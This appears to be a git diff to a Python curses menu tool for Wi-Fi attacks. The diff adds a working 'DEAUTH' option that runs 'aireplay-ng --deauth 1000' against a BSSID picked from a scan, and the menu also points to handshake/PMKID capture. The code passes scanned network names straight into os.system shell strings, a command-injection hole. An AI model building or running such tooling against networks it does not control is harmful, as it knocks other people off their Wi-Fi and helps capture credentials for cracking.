@@ -1,4 +1,4 @@
-from time import sleep
+from getmac import get_mac_address
 import netifaces
 import curses, os #curses is the interface for capturing key presses on the menu, os launches the files
 screen = curses.initscr() #initializes a new window for capturing key presses
@@ -27,7 +27,8 @@ interfaces = netifaces.interfaces()
 selected_interface = ""
 interface_mode = ""
 target = ""
-
+target_BSSID =""
+interface_mac=""
 list2 = []
 
 for x in interfaces:
@@ -81,7 +82,7 @@ def set_data():
         { 'title': "Fix network issues", 'type': COMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart' },
         { 'title': "select Wifi target", 'type': WIFISEL, 'subtitle': "selected target: " + target, 'options': wifilist },
         { 'title': "DOS atack menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
-          {'title': "NO", 'type': COMMAND, 'command': 'echo > log funciona' },
+          {'title': "DEAUTH", 'type': COMMAND, 'command': 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
           {'title': "NO", 'type': EXITMENU, },
@@ -171,6 +172,8 @@ def processmenu(menu, parent = None):
   global menu_data
   global wifilist
   global wilist
+  global target_BSSID
+  global interface_mac
   wifilist = []
   optioncount = len(menu['options'])
   exitmenu = False
@@ -188,7 +191,8 @@ def processmenu(menu, parent = None):
       curses.def_prog_mode()    # save curent curses environment
       os.system('reset')
       screen.clear() #clears previous screen
-      os.system(menu_data['options'][getin]['command']) # run the command
+      os.system('echo > log ' + (menu['options'][getin]['command']))
+      os.system(menu['options'][getin]['command']) # run the command
       screen.clear() #clears previous screen on key press and updates display based on pos
       curses.reset_prog_mode()   # reset to 'current' curses environment
       curses.curs_set(1)         # reset doesn't do this right
@@ -209,7 +213,7 @@ def processmenu(menu, parent = None):
 
       os.system('echo > log ' + str(wilist))
       for x in wilist:
-        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"] })
+        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["BSSID"]})
       screen.clear() #clears previous screen on key press and updates display based on pos
       menu = menu_data
       screen.clear() #clears previous screen on key press and updates display based on pos
@@ -222,6 +226,7 @@ def processmenu(menu, parent = None):
 
     elif menu['options'][getin]['type'] == WIFIOPT:
       target = menu['options'][getin]['command']
+      target_BSSID = menu['options'][getin]['BSSID']
       set_data()
       exitmenu = True #returns to main menu
       screen.clear()
@@ -229,11 +234,12 @@ def processmenu(menu, parent = None):
     
     elif menu['options'][getin]['type'] == INTSEL:
       selected_interface = menu['options'][getin]['command']
+      interface_mac = str(get_mac_address(interface= selected_interface ))
       set_data()
       exitmenu = True #returns to main menu
       screen.clear()
       screen.refresh()
-      os.system('echo > log ' + str(menu))
+      os.system('echo > log ' + str(get_mac_address(interface= selected_interface )))
 
 
     elif menu['options'][getin]['type'] == EXITMENU:
